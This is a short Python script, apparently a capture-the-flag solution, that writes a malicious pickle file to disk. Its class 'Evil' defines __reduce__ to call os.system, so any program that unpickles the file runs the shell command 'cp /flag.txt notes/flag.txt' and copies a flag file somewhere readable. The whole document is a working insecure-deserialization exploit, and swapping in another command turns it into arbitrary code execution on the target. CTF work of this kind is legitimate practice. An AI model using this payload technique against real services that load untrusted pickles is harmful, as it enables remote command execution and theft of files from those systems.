import pickle
import os

class Evil(object):
	def __reduce__(self):
		return (os.system, ('cp /flag.txt notes/flag.txt', ))

pickle_data = pickle.dumps(Evil())

with open('payload', 'wb') as f:
	f.write(pickle_data)

